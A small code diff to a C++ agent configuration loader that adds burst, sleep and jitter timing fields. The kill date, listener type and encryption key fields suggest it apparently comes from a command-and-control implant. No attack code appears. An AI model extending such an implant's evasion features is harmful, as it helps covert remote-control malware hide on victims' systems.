@@ -81,6 +81,9 @@ AgentConfig::AgentConfig()
 	this->profile.label_size  = packer->Unpack32();
 	this->profile.ttl         = packer->Unpack32();
 	this->profile.encrypt_key = this->encrypt_key;
+	this->profile.burst_enabled = packer->Unpack32();
+	this->profile.burst_sleep   = packer->Unpack32();
+	this->profile.burst_jitter  = packer->Unpack32();
 
 	this->listener_type       = packer->Unpack32();
 	this->kill_date           = packer->Unpack32();
